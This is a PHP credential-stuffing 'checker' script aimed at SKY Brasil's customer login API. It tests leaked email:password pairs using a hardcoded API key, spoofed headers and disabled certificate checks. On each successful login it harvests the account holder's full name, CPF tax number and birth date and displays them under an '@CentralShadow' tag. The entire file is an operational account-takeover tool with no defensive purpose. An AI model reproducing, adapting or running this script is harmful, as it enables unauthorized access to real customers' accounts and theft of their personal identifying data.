<?php

error_reporting(0);
set_time_limit(0);

function multiexplode($delimiters, $string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}

	$lista = $_GET['lista'];
	$explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $lista);
	$explode = array_values(array_filter($explode));
	@$email = trim($explode[0]);
	@$senha = trim($explode[1]);


function dados($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, 'https://api.skybr.digital/prd/login');
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'Host: api.skybr.digital',
'accept: */*',
'origin: https://www.sky.com.br',
'x-api-key: 8u4jhqbDOA1s0D35asyLV2LdINpAzofE2U37uehL',
'X-user-id: SiteSKY',
'X-consumer-system: SiteSKY',
'save-data: on',
'user-agent: Mozilla/5.0 (Linux; Android 7.1.2; LM-X210 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'content-type: application/json',
'referer: https://www.sky.com.br/minha-sky/login',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
,));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie1.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch,CURLOPT_POSTFIELDS, '{"login":"'.$email.'", "senha":"'.$senha.'"}');
        $result = curl_exec($ch);

        #echo $result;

        $nome = dados($result, '"NomeCompleto\":\"','\"', 1);
        $cpf = dados($result, '"CPF_CNPJ\":\"','\"', 1);
        $data = dados($result, '"DataNascimento\":\"','T', 1);
 
  
    if (strpos($result, '"Status":1') !== false) {
echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  $email | $senha </span><span class='label label-info' style='color: white'> Informações [ NOME: $nome CPF: $cpf Nascimento: $data ]</span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>@CentralShadow</span>";

}
else{
	echo " Reprovada $email | $senha ";
	
}




?>
